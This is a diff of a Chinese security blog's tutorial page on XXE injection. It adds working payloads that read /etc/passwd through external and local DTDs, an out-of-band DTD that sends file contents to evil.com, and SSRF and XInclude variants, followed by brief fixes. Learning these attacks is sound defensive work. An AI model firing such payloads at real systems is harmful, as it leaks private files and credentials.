@@ -28,7 +28,7 @@
 <meta property="og:description" content="什么是XXEXXE就是XML外部实体注入(XML External Entity)。XXE可以分为in-band XXE就是web程序即时响应攻击者的XXE-Paylod，另外一种则是out-of-band XXE也被称为blind XXE，web程序不会即使响应攻击的XXE-Payload，攻击者必须将XXE-Payload的输出放到其他文件或攻击者的服务器上。 XXE的危害:  敏感文件泄露">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-05-27T01:51:44.000Z">
-<meta property="article:modified_time" content="2020-11-10T05:52:41.215Z">
+<meta property="article:modified_time" content="2021-05-20T16:16:04.325Z">
 <meta property="article:author" content="atsud0">
 <meta property="article:tag" content="XML">
 <meta property="article:tag" content="XXE">
@@ -143,7 +143,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">207</span></a>
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">208</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -153,7 +153,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">163</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">164</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -242,7 +242,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-11-10 13:52:41" itemprop="dateModified" datetime="2020-11-10T13:52:41+08:00">2020-11-10</time>
+                <time title="Modified: 2021-05-21 00:16:04" itemprop="dateModified" datetime="2021-05-21T00:16:04+08:00">2021-05-21</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -267,14 +267,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>3.4k</span>
+              <span>5k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>3 mins.</span>
+              <span>5 mins.</span>
             </span>
 
         </div>
@@ -370,24 +370,51 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note[&lt;!ENTITY name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;&amp;name;&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
 
 <p>内部参数实体</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note[&lt;!ENTITY % name &quot;hello&quot;&gt;</span><br><span class="line">%name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note[&lt;!ENTITY % name &quot;hello&quot;&gt;%name;]&gt;</span><br></pre></td></tr></table></figure>
 
 <p>外部参数实体</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note[&lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">%name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note[&lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; %name;]&gt;</span><br></pre></td></tr></table></figure>
 
 <p>参数实体在DTD中解析优先级高于xml内部实体</p>
-<h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><p>基础注入<br>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note[&lt;!ENTITY name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;&amp;name;&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="引入外部恶意DTD文件"><a href="#引入外部恶意DTD文件" class="headerlink" title="引入外部恶意DTD文件"></a>引入外部恶意DTD文件</h3><p>在http服务器上部署一个恶意dtd文件，内容如下：</p>
+<p>PAYLOAD1(触发XML解析错误):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">	&lt;!ENTITY name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;phpStudy&#x2F;WWW&#x2F;123.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<p>PAYLOAD2(OOB带外xxe):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;http:&#x2F;&#x2F;evil.com&#x2F;?a&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>
 
-<p>这里的file可以使用其他的php伪协议</p>
+<p>请求payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [ &lt;!ENTITY % ext SYSTEM &quot;http:&#x2F;&#x2F;evil.com&#x2F;ext.dtd&quot;&gt; %ext;]&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><h4 id="基础注入"><a href="#基础注入" class="headerlink" title="基础注入"></a>基础注入</h4><p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note[&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;&amp;xxe;&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE note[</span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;phpStudy&#x2F;WWW&#x2F;123.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里的file可以甚至可以使用其他的php伪协议</p>
+<h4 id="引入本地DTD"><a href="#引入本地DTD" class="headerlink" title="引入本地DTD"></a>引入本地DTD</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#39;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">    &#39;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note[&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;vuln.com&#x2F;password.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;&amp;xxe;&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Xinclude-攻击"><a href="#Xinclude-攻击" class="headerlink" title="Xinclude 攻击"></a>Xinclude 攻击</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;foo xmlns:xi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XInclude&quot;&gt;&lt;xi:include parse&#x3D;&quot;text&quot; href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&#x2F;&gt;&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="xxe-文件上传攻击"><a href="#xxe-文件上传攻击" class="headerlink" title="xxe 文件上传攻击"></a>xxe 文件上传攻击</h4><p>漏洞一般</p>
 <h2 id="XXE-修复方式"><a href="#XXE-修复方式" class="headerlink" title="XXE 修复方式"></a>XXE 修复方式</h2><ol>
-<li>(libxml_disable_entity_loader()禁止解析xml外部实体</li>
+<li>(php-libxml_disable_entity_loader()禁止解析xml外部实体</li>
+<li>禁用对Xinclude的支持。</li>
 </ol>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
 <li><a href="https://www.cnblogs.com/backlion/p/9302528.html" title="" target="">XML外部实体（XXE）注入详解</a></li>
 <li><a href="https://tryhackme.com/room/xxe" title="" target="">XXE</a></li>
+<li><a href="https://xz.aliyun.com/t/3357" title="" target="">一篇文章带你深入理解漏洞之 XXE 漏洞</a>
+
+</li>
 </ul>
 
     </div>
@@ -430,8 +457,8 @@
       <i class="fa fa-chevron-left"></i> TryHackMe-alfred
     </a></div>
       <div class="post-nav-item">
-    <a href="/2020/05/30/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="next" title="代码-命令执行漏洞">
-      代码-命令执行漏洞 <i class="fa fa-chevron-right"></i>
+    <a href="/2020/05/30/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="next" title="PHP代码/命令执行漏洞">
+      PHP代码/命令执行漏洞 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -491,7 +518,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是XXE"><span class="nav-number">1.</span> <span class="nav-text">什么是XXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是XML"><span class="nav-number">2.</span> <span class="nav-text">什么是XML</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#为什么使用XML"><span class="nav-number">3.</span> <span class="nav-text">为什么使用XML</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML语法"><span class="nav-number">4.</span> <span class="nav-text">XML语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-DTD"><span class="nav-number">5.</span> <span class="nav-text">XML-DTD</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#定义一个实体"><span class="nav-number">5.1.</span> <span class="nav-text">定义一个实体</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE注入"><span class="nav-number">6.</span> <span class="nav-text">XXE注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE-修复方式"><span class="nav-number">7.</span> <span class="nav-text">XXE 修复方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">8.</span> <span class="nav-text">参考</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是XXE"><span class="nav-number">1.</span> <span class="nav-text">什么是XXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是XML"><span class="nav-number">2.</span> <span class="nav-text">什么是XML</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#为什么使用XML"><span class="nav-number">3.</span> <span class="nav-text">为什么使用XML</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML语法"><span class="nav-number">4.</span> <span class="nav-text">XML语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-DTD"><span class="nav-number">5.</span> <span class="nav-text">XML-DTD</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#定义一个实体"><span class="nav-number">5.1.</span> <span class="nav-text">定义一个实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#引入外部恶意DTD文件"><span class="nav-number">5.2.</span> <span class="nav-text">引入外部恶意DTD文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE注入"><span class="nav-number">6.</span> <span class="nav-text">XXE注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基础注入"><span class="nav-number">6.0.1.</span> <span class="nav-text">基础注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#引入本地DTD"><span class="nav-number">6.0.2.</span> <span class="nav-text">引入本地DTD</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF"><span class="nav-number">6.0.3.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Xinclude-攻击"><span class="nav-number">6.0.4.</span> <span class="nav-text">Xinclude 攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xxe-文件上传攻击"><span class="nav-number">6.0.5.</span> <span class="nav-text">xxe 文件上传攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE-修复方式"><span class="nav-number">7.</span> <span class="nav-text">XXE 修复方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">8.</span> <span class="nav-text">参考</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -507,7 +534,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">163</span>
+          <span class="site-state-item-count">164</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -520,7 +547,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/index.html">
           
-        <span class="site-state-item-count">207</span>
+        <span class="site-state-item-count">208</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -590,13 +617,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">485k</span>
+    <span title="Symbols count total">511k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">7:21</span>
+    <span title="Reading time total">7:45</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
   </div>
